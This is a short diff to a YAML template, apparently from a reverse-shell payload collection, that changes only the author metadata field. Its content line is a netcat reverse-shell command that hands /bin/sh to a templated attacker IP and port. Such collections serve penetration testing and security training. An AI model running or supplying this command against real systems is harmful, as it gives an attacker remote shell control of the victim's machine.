@@ -3,7 +3,7 @@ metadata:
   filename: "revshell-linux-nc.yaml"
   tags: ["shell", "linux"]
   created: "2025-03-29"
-  author: "Unknown"
+  authors: ["Unknown"]
 
 content: |
   nc -e /bin/sh {{ attacker_ip }} {{ shell_port }}
